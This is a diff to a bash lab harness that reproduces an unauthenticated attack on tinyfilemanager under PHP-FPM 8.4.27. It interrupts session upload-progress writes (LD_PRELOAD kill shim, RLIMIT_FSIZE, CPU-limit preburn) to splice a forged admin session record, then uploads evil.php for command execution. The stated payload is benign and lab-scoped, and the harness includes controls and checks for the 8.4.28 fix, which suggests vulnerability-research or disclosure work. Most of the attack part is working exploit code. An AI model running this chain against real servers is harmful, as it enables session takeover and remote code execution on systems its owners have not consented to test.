@@ -14,9 +14,10 @@
 # lab-chosen benign payload (unique marker print + `id` into the
 # response and a marker file inside the lab tmpdir).
 #
-# Death is still the committed LD_PRELOAD kill shim (rung-4 mechanics) —
-# the rung-5 attacker-caused death is a separate harness (stage 2).
-#
+# Death modes: shim = LD_PRELOAD partial-write SIGKILL (rung-4 mechanics);
+# rlimit = no phase-2 preload, deployment RLIMIT_FSIZE short write plus an
+# optional wire-driven RLIMIT_CPU worker death (PREBURN=1). Calibration still
+# uses the shim in LOG_ONLY mode; it cannot kill in phase 1.
 # Differences from the Drupal harness, all forced by the consumer app:
 # - session.use_cookies = 1 (tinyfilemanager never calls session_id();
 #   PHP 8.4 ignores incoming cookie ids with use_cookies=0). Producers
@@ -27,17 +28,32 @@
 # - consumer needs QUERY_STRING=p= (the app redirects otherwise) and
 #   HTTP_HOST.
 #
-# Usage: bash lab/repro/php2shell-aftershell-splice-tfm.sh <php-fpm-bin> <tfm-web> [outdir] [port]
-#   <php-fpm-bin>: lab/build/php-8.4.27-app/sapi/fpm/php-fpm
-#   <tfm-web>:     lab/src/php2shell-r5-app/tfm-app/web (provision-tfm-app.sh)
+# Usage: DEATH_MODE=rlimit PREBURN=1 bash lab/repro/php2shell-aftershell-splice-tfm.sh <php-fpm-bin> <tfm-web> [outdir] [port]
+#   Optional attacker-byte variance: SID=<32 hex> FILLER=<one byte>.
 
 set -u
 DEATH_MODE=${DEATH_MODE:-shim}
 [ "$DEATH_MODE" = shim ] || [ "$DEATH_MODE" = rlimit ] || { echo "DEATH_MODE must be shim or rlimit"; exit 2; }
 NATIVE_ATTACK=0
+[ "$DEATH_MODE" = rlimit ] && NATIVE_ATTACK=1
 if [ -z "${DISPLAY_ERRORS+x}" ]; then DISPLAY_ERRORS=1; [ "$DEATH_MODE" = rlimit ] && DISPLAY_ERRORS=0; fi
+if [ "$DEATH_MODE" = rlimit ] && [ "${PREBURN:-0}" = 1 ]; then
+    PROGRESS_FREQ=${PROGRESS_FREQ:-100%}
+    ARMED_BYTES=${ATTACK_BYTES:-8388608}
+    ARMED_TRAIL_BYTES=${TRAIL_BYTES:-134217728}
+else
+    PROGRESS_FREQ=${PROGRESS_FREQ:-1%}
+    ARMED_BYTES=${ATTACK_BYTES:-8192}
+    ARMED_TRAIL_BYTES=0
+fi
+TRAIL_BYTES=0
 FPM=$(readlink -f "$1")
 WEB=$(readlink -f "$2")
+FPM_VERSION=$("$FPM" -v | sed -n 's/^PHP \([0-9][0-9.]*\).*/\1/p')
+APP_HEALTH=0
+if [ "$(printf '%s\n' 8.4.28 "$FPM_VERSION" | sort -V | head -n 1)" = 8.4.28 ]; then
+    APP_HEALTH=1
+fi
 OUT=${3:-lab/build/evidence}
 PORT=${PORT:-${4:-18134}}
 BUILDDIR=$(dirname "$(dirname "$(dirname "$FPM")")")
@@ -47,6 +63,7 @@ CLIENT=$(cd "$(dirname "$0")" && pwd)/php2shell-fpm-client.py
 mkdir -p "$OUT"
 LOG="$OUT/aftershell-tfm-$LABEL.log"
 : > "$LOG"
+echo "runtime: $FPM_VERSION binary=$FPM kernel=$(uname -r) mode=$DEATH_MODE preburn=${PREBURN:-0}" >> "$LOG"
 
 REPOROOT=$(cd "$(dirname "$(dirname "$(dirname "$(readlink -f "$0")")")")" && pwd)
 SO="$REPOROOT/lab/preload/aftershell-kill.so"
@@ -55,14 +72,14 @@ cc -shared -fPIC -O2 -o "$SO" "$REPOROOT/lab/php2shell/aftershell-kill.c" || {
     echo "cc failed"; exit 1; }
 
 D=$(mktemp -d)
-MTAG="php2shell-r5-$(date -u +%H%M%S)"
+MTAG=${MTAG:-php2shell-r5-$(date -u +%H%M%S)}
 MARKER="$D/rce-marker-$MTAG.txt"
 MPID=
-cleanup() { [ -n "${KEEP_TMP:-}" ] || rm -rf "$D"; }
+cleanup() { stop_fpm; [ -n "${KEEP_TMP:-}" ] || rm -rf "$D"; }
 trap cleanup EXIT
 SESS="$D/sess"; mkdir -p "$SESS"
 FPMCONF="$D/fpm.conf"
-SID="deadbeef00112233445566778899aabb"
+SID=${SID:-deadbeef00112233445566778899aabb}
 DUMP="$D/pwrites.bin"
 ARM="$D/armed"
 BOUNDARY='---------------------------20896060251896012921717172737'
@@ -70,7 +87,10 @@ KA2=""
 HOST=127.0.0.1
 
 OBJ='filemanager|a:1:{s:6:"logged";s:5:"admin";}'
-X700=$(head -c 700 /dev/zero | tr '\0' 'X')
+FILLER=${FILLER:-X}
+[ "${#FILLER}" = 1 ] || { echo "FILLER must be one byte"; exit 2; }
+X700=$(head -c 700 /dev/zero | tr '\0' "$FILLER")
+rm -f "$WEB/evil.php"
 EVIL="$D/evil.php"
 cat > "$EVIL" <<EOF
 <?php
@@ -115,7 +135,7 @@ php_admin_value[session.upload_progress.enabled] = 1
 php_admin_value[session.upload_progress.cleanup] = 0
 php_admin_value[session.upload_progress.prefix] = upload_progress_
 php_admin_value[session.upload_progress.name] = PHP_SESSION_UPLOAD_PROGRESS
-php_admin_value[session.upload_progress.freq] = 1%
+php_admin_value[session.upload_progress.freq] = $PROGRESS_FREQ
 php_admin_value[session.upload_progress.min_freq] = 0.000000001
 EOF
 { echo "--- generated fpm.conf (tmpdir $D) ---"; cat "$D/fpm.conf"; echo "--- end fpm.conf ---"; } >> "$LOG"
@@ -138,6 +158,10 @@ mpbody() { # $1 = progress key, $2 = raw filename, $3 = upload bytes
     printf -- "--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n%s\r\n" "$BOUNDARY" "$1"
     printf -- "--%s\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"%s\"\r\n\r\n" "$BOUNDARY" "$(esc_fn "$2")"
     head -c "$3" /dev/zero | tr '\0' 'U'
+    if [ "${TRAIL_BYTES:-0}" -gt 0 ]; then
+        printf "\r\n--%s\r\nContent-Disposition: form-data; name=\"burn\"\r\n\r\n" "$BOUNDARY"
+        head -c "$TRAIL_BYTES" /dev/zero
+    fi
     printf "\r\n--%s--\r\n" "$BOUNDARY"
 }
 post() { # $1 = progress key, $2 = raw filename -> a REAL tinyfilemanager request (no cookie)
@@ -253,7 +277,9 @@ echo "== FPM phase-1 master pid=$MPID label=$LABEL build=$BUILDDIR child=$CHILD 
 
 build_carrier 100
 rm -f "$DUMP"
-POST_BYTES=${ATTACK_BYTES:-8192} post carr "$X700" >> "$LOG" 2>&1
+TRAIL_BYTES=$ARMED_TRAIL_BYTES
+POST_BYTES=$ARMED_BYTES post carr "$X700" >> "$LOG" 2>&1
+TRAIL_BYTES=0
 K=$(python3 -c 'import sys
 d=open(sys.argv[1],"rb").read()
 i=d.find(b"=== pwrite"); j=d.find(b"\n", i) + 1
@@ -313,6 +339,37 @@ start_fpm
 OLDCHILD=$CHILD
 echo "== FPM phase-2 master pid=$MPID mode=$DEATH_MODE boundary=$K child=$OLDCHILD" >> "$LOG"
 if [ "$DEATH_MODE" = rlimit ]; then
+    if [ "${PREBURN:-0}" = 1 ]; then
+        TARGET_SID=$SID
+        SID=00112233445566778899aabbccddeeff
+        HZ=$(getconf CLK_TCK)
+        COARSE_TICKS=$((HZ * 90 / 100))
+        TARGET_TICKS=$((HZ * ${PREBURN_TARGET:-98} / 100))
+        TICKS=$(worker_cpu_ticks "$OLDCHILD")
+        COARSE_N=0
+        for BURN_N in $(seq 1 400); do
+            [ "$TICKS" -ge "$COARSE_TICKS" ] && break
+            POST_BYTES=${BURN_BYTES:-4194304} post carr "$X700" > "$D/preburn.out" 2>&1
+            COARSE_N=$BURN_N
+            TICKS=$(worker_cpu_ticks "$OLDCHILD")
+        done
+        [ "$TICKS" -ge "$COARSE_TICKS" ] || { echo "CPU coarse preburn failed" | tee -a "$LOG"; KEEP_TMP=1 exit 1; }
+        FINE_N=0
+        while [ "$TICKS" -lt "$TARGET_TICKS" ] && [ "$FINE_N" -lt 400 ]; do
+            POST_BYTES=${FINE_BURN_BYTES:-65536} post carr "$X700" > "$D/preburn.out" 2>&1
+            FINE_N=$((FINE_N + 1))
+            TICKS=$(worker_cpu_ticks "$OLDCHILD")
+        done
+        SID=$TARGET_SID
+        CPU_SEC=$((TICKS / HZ))
+        CPU_REM=$((TICKS % HZ))
+        if [ "$CPU_REM" -lt 97 ] || [ "$CPU_REM" -gt 99 ]; then
+            echo "CPU fine preburn missed safe arming window: ticks=$TICKS rem=$CPU_REM" | tee -a "$LOG"
+            KEEP_TMP=1 exit 1
+        fi
+        CPU_LIMIT=$((CPU_SEC + 1))
+        echo "preburn: coarse_requests=$COARSE_N fine_requests=$FINE_N cpu_ticks=$TICKS hz=$HZ armed_RLIMIT_CPU=$CPU_LIMIT" >> "$LOG"
+    fi
     prlimit --pid "$OLDCHILD" --fsize="$K:$K" >> "$LOG" 2>&1 || {
         echo "failed to set worker RLIMIT_FSIZE" | tee -a "$LOG"; KEEP_TMP=1 exit 1; }
     prlimit --pid "$OLDCHILD" --fsize >> "$LOG" 2>&1
@@ -324,32 +381,57 @@ if [ "$DEATH_MODE" = rlimit ]; then
 else
     touch "$ARM"
 fi
-POST_BYTES=${ATTACK_BYTES:-8192} post carr "$X700" >> "$LOG" 2>&1
+TRAIL_BYTES=$ARMED_TRAIL_BYTES
+POST_BYTES=$ARMED_BYTES post carr "$X700" >> "$LOG" 2>&1
 RC=$?
 rm -f "$ARM"
-echo "kill-run rc=$RC (2 = FASTCGI_ERROR: worker died mid-request, expected)" >> "$LOG"
-FILESZ=$(wc -c < "$SESS/sess_$SID")
-echo "file-after-kill: $FILESZ bytes" >> "$LOG"
+ATTACK_FILE="$SESS/sess_$SID"
+if [ -f "$ATTACK_FILE" ]; then
+    FILESZ=$(wc -c < "$ATTACK_FILE")
+else
+    FILESZ=0
+fi
+echo "attack-run rc=$RC file-after-run: $FILESZ bytes" >> "$LOG"
 ls -l "$SESS" >> "$LOG" 2>&1
-echo "  bytes-K-onward: $(seg_after "$SESS/sess_$SID" 'filemanager|a:1:' | head -c 60)" >> "$LOG"
+if [ -f "$ATTACK_FILE" ]; then
+    echo "  bytes-K-onward: $(seg_after "$ATTACK_FILE" 'filemanager|a:1:' | head -c 60)" >> "$LOG"
+fi
 
 NEWCHILD=$(wait_child) || { echo "master did NOT respawn a worker — inspect $LOG" | tee -a "$LOG"; KEEP_TMP=1 exit 1; }
-echo "master respawned worker: old=$OLDCHILD new=$NEWCHILD" >> "$LOG"
-[ "$NEWCHILD" = "$OLDCHILD" ] && echo "WARNING: same child pid — kill may not have fired" >> "$LOG"
+echo "master worker after run: old=$OLDCHILD new=$NEWCHILD" >> "$LOG"
+[ "$NEWCHILD" = "$OLDCHILD" ] && echo "WARNING: same child pid — CPU death may not have fired" >> "$LOG"
 
 MIXOK=0
-python3 - "$SESS/sess_$SID" "$CARRIER" "$K" <<'EOF' >> "$LOG" 2>&1 && MIXOK=1
+if [ -f "$ATTACK_FILE" ]; then
+    python3 - "$ATTACK_FILE" "$CARRIER" "$K" <<'EOF' >> "$LOG" 2>&1 && MIXOK=1
 import sys
 f = open(sys.argv[1], 'rb').read()
 c = open(sys.argv[2], 'rb').read()
 k = int(sys.argv[3])
-ok = len(f) > k and f[k:] == c[k:] and f[k:k+44].startswith(b'filemanager|a:1:')
-print(f"splice-check: filelen={len(f)} K={k} tail==carrier-tail:{f[k:]==c[k:]} obj-at-K:{f[k:k+44][:24]!r}")
+prefix_ok = f[:k].startswith(b'upload_progress_carr|a:') and f[:k].endswith(b'}')
+tail_ok = len(f) > k and f[k:] == c[k:]
+boundary_ok = f[k:k+44].startswith(b'filemanager|a:1:')
+ok = prefix_ok and tail_ok and boundary_ok
+print(f"splice-check: filelen={len(f)} K={k} new-record-prefix:{prefix_ok} tail==carrier-tail:{tail_ok} obj-at-K:{f[k:k+44][:24]!r}")
 sys.exit(0 if ok else 1)
 EOF
-[ "$MIXOK" = 1 ] && echo "  post-kill file state: k1new || C[K:] splice on disk" >> "$LOG" \
-               || echo "  post-kill file state: NOT the splice (8.4.28: expected)" >> "$LOG"
+else
+    echo "splice-check: attacker session file absent" >> "$LOG"
+fi
+[ "$MIXOK" = 1 ] && echo "  post-run file state: k1new || C[K:] splice on disk" >> "$LOG" \
+               || echo "  post-run file state: NOT the splice (8.4.28: expected)" >> "$LOG"
 [ "$FILESZ" = "$K" ] && echo "  (file size == K: ftruncate-first — vendor-fix behavior)" >> "$LOG"
+
+# PHP 8.4.28+ rejects tinyfilemanager's runtime session ini change while
+# upload_progress is On. Keep the producer pool vulnerable for the attack,
+# then use an upload_progress-off pool with the same save_path for app checks.
+if [ "$APP_HEALTH" = 1 ]; then
+    sed 's/^php_admin_value\[session.upload_progress.enabled\] = 1$/php_admin_value[session.upload_progress.enabled] = 0/' "$FPMCONF" > "$D/fpm-health.conf"
+    stop_fpm
+    FPMCONF="$D/fpm-health.conf"
+    start_fpm
+    echo "== FPM app-health pool master pid=$MPID child=$CHILD (upload_progress off)" >> "$LOG"
+fi
 
 # ---- consumer: RESPAWNED worker runs the REAL tinyfilemanager request
 # with the spliced session; the app's own session decode is the consume path.
@@ -408,33 +490,17 @@ else
     cat "$D/upload.out" >> "$LOG"
     grep -q 'Token' "$D/upload.out" && echo "   control upload rejected (token invalid/missing), as expected" | tee -a "$LOG"
 fi
-[ -f "$MARKER" ] && { echo "   marker file $MARKER:"; cat "$MARKER"; } >> "$LOG"
 MARKER_CONTENT=$(cat "$MARKER" 2>/dev/null || true)
-echo "marker-file-present: $([ -n "$MARKER_CONTENT" ] && echo yes || echo no)" | tee -a "$LOG"
+echo "marker-file-present-after-attack: $([ -n "$MARKER_CONTENT" ] && echo yes || echo no)" | tee -a "$LOG"
+[ -f "$MARKER" ] && { echo "   marker file $MARKER:"; cat "$MARKER"; } >> "$LOG"
+# Preserve the positive side effect in the log, then require both controls to
+# leave a fresh marker absent rather than counting the earlier positive file.
+rm -f "$MARKER" "$WEB/evil.php"
 
-# ---- control: identical carrier + replacement WITHOUT the kill
+# ---- control: identical carrier + replacement WITHOUT the CPU death
 build_carrier "$PADLEN"
-POST_BYTES=${ATTACK_BYTES:-8192} post carr "$X700" >> "$LOG" 2>&1
+POST_BYTES=$ARMED_BYTES post carr "$X700" >> "$LOG" 2>&1
 echo "control-write rc=$?" >> "$LOG"
-# ---- fixed-build app-health lane: PHP 8.4.28 adds the
-# SESSION_CHECK_UPLOAD_PROGRESS_STATE guard (session.c:94-100) — runtime
-# session ini changes THROW while session.upload_progress.enabled is On,
-# so tinyfilemanager's session_cache_limiter() at line 231 fatals and the
-# app cannot serve ANY request in the producer pool. The carrier for the
-# no-kill control was rebuilt in the MAIN pool above (producers need
-# upload_progress); consumer checks switch to an app-health pool with the
-# progress ini off, same save_path. On 8.4.27 no fatal fires and the
-# pool never switches.
-GUARD=0
-if grep -q "cannot be changed at runtime" "$D/consumerA.out" 2>/dev/null; then
-    GUARD=1
-    echo "   PHP 8.4.28 session-ini guard observed: app fatals in session_cache_limiter() while upload_progress is On (fix-series hardening)" | tee -a "$LOG"
-    sed 's/^php_admin_value\[session.upload_progress.enabled\] = 1$/php_admin_value[session.upload_progress.enabled] = 0/' "$D/fpm.conf" > "$D/fpm2.conf"
-    stop_fpm
-    FPMCONF="$D/fpm2.conf"
-    start_fpm
-    echo "== FPM phase-2b app-health pool master pid=$MPID child=$CHILD (upload_progress off)" >> "$LOG"
-fi
 rm -f "$DUMP"
 consumer CTL > "$D/consumerCTL.out" 2>&1
 cat "$D/consumerCTL.out" >> "$LOG"
@@ -447,31 +513,37 @@ ok = b'}filemanager|a:1:{s:6:"logged";s:5:"admin";}' in d
 print(f"control-write-dump: has-evil-record:{ok}")
 sys.exit(0 if ok else 1)
 EOF
-    [ "$CTL_PROMOTED" = 1 ] && echo "   CONTROL UNEXPECTED: evil record without kill — harness invalid" | tee -a "$LOG" \
-                           || echo "   control (no kill): no evil record in the app session write, as expected" | tee -a "$LOG"
+    [ "$CTL_PROMOTED" = 1 ] && echo "   CONTROL UNEXPECTED: evil record without death — harness invalid" | tee -a "$LOG" \
+                           || echo "   control (no death): no evil record in the app session write, as expected" | tee -a "$LOG"
 fi
-CTL_TAKEOVER=0
-grep -q 'name="fm_usr"' "$D/consumerCTL.out" || CTL_TAKEOVER=1
-[ "$CTL_TAKEOVER" = 1 ] && echo "   CONTROL UNEXPECTED: logged-in page without the kill — inspect $LOG" | tee -a "$LOG" \
-                       || echo "   control (no kill): login form, session takeover needs the interrupted write" | tee -a "$LOG"
-if [ -f "$WEB/evil.php" ]; then
-    echo "   CONTROL UNEXPECTED: evil.php present without takeover" | tee -a "$LOG"
+CTL_TOKEN=$(python3 -c 'import re,sys
+d=open(sys.argv[1],"r",errors="replace").read()
+m=re.search(r"name=\"token\" value=\"([0-9a-f]+)\"",d)
+print(m.group(1) if m else "")' "$D/consumerCTL.out")
+if [ -n "$CTL_TOKEN" ] && ! grep -q 'name="fm_usr"' "$D/consumerCTL.out"; then
+    echo "   CONTROL UNEXPECTED: logged-in page without death — inspect $LOG" | tee -a "$LOG"
+elif grep -q 'name="fm_usr"' "$D/consumerCTL.out"; then
+    echo "   control (no death): login form, no session takeover" | tee -a "$LOG"
+else
+    echo "   CONTROL INVALID: neither login form nor admin page — inspect $LOG" | tee -a "$LOG"
 fi
-# safe-input control: virgin sid, no carrier, no kill
-rm -f "$SESS"/sess_* "$WEB/evil.php"
+if [ -f "$WEB/evil.php" ] || [ -f "$MARKER" ]; then
+    echo "   CONTROL UNEXPECTED: upload or marker present without death" | tee -a "$LOG"
+fi
+
+# safe-input control: virgin sid, no carrier, no death
+rm -f "$SESS"/sess_* "$WEB/evil.php" "$MARKER"
 consumer SAFE cccc00112233445566778899aabbcccc > "$D/consumerSAFE.out" 2>&1
-grep -q 'name="fm_usr"' "$D/consumerSAFE.out" \
-    && echo "   safe-input control (virgin sid): login form, no session, as expected" | tee -a "$LOG" \
-    || echo "   safe-input control UNEXPECTED — inspect $LOG" | tee -a "$LOG"
-if [ -f "$MARKER" ]; then
-    if [ "$EXECOK" = 1 ]; then echo "   marker file present (from the executed payload)" | tee -a "$LOG"
-    else echo "   CONTROL UNEXPECTED: marker file present without takeover+exec — harness invalid" | tee -a "$LOG"; fi
+if grep -q 'name="fm_usr"' "$D/consumerSAFE.out" && [ ! -f "$MARKER" ] && [ ! -f "$WEB/evil.php" ]; then
+    echo "   safe-input control (virgin sid): login form, no upload, marker absent" | tee -a "$LOG"
+else
+    echo "   safe-input control UNEXPECTED — inspect $LOG" | tee -a "$LOG"
 fi
 
 # ---------------------------------------------------------------- verdict
 echo "== verdict scan (log: $LOG)" | tee -a "$LOG"
 [ "$MIXOK" = 1 ] && echo "   splice on disk before the consumer (k1new || C[K:])" | tee -a "$LOG" \
-                  || echo "   post-kill file NOT the splice (8.4.28: expected)" | tee -a "$LOG"
+                  || echo "   post-run file NOT the splice (8.4.28: expected)" | tee -a "$LOG"
 if [ "$PROMOTED" = 2 ]; then
     echo "   native producer/consumer: no preload; promotion judged by tinyfilemanager authentication" | tee -a "$LOG"
 else
@@ -479,11 +551,14 @@ else
                         || echo "   no promotion through the app (see $LOG)" | tee -a "$LOG"
 fi
 [ "$TAKEOVER" = 1 ] && echo "   UNAUTH SESSION TAKEOVER of tinyfilemanager admin through the splice" | tee -a "$LOG" \
-                    || echo "   no takeover (8.4.28/no-kill: expected)" | tee -a "$LOG"
+                    || echo "   no takeover (8.4.28/no-death: expected)" | tee -a "$LOG"
 if [ "$EXECOK" = 1 ]; then
-    echo "   UNAUTH -> $DEATH_MODE WRITE INTERRUPTION -> ADMIN UPLOAD -> LIVE-WORKER COMMAND EXECUTION (marker $MTAG)" | tee -a "$LOG"
+    echo "   UNAUTH -> $DEATH_MODE SHORT-WRITE/STATE-FREEZE -> ADMIN UPLOAD -> LIVE-WORKER COMMAND EXECUTION (marker $MTAG)" | tee -a "$LOG"
 else
-    echo "   no command execution (8.4.28/no-kill: expected)" | tee -a "$LOG"
+    echo "   no command execution (8.4.28/no-death: expected)" | tee -a "$LOG"
+fi
+if [ "$DEATH_MODE" = rlimit ]; then
+    echo "   native limits: worker FSIZE=$K:$K CPU=${CPU_LIMIT:-none}:${CPU_LIMIT:-none}; phase-2 LD_PRELOAD unset" | tee -a "$LOG"
 fi
 grep -qE 'AddressSanitizer|runtime error:|SEGV|Assertion.*failed|SUMMARY' "$LOG" && \
     echo "   SANITIZER/ASSERT OUTPUT PRESENT — inspect $LOG" | tee -a "$LOG"
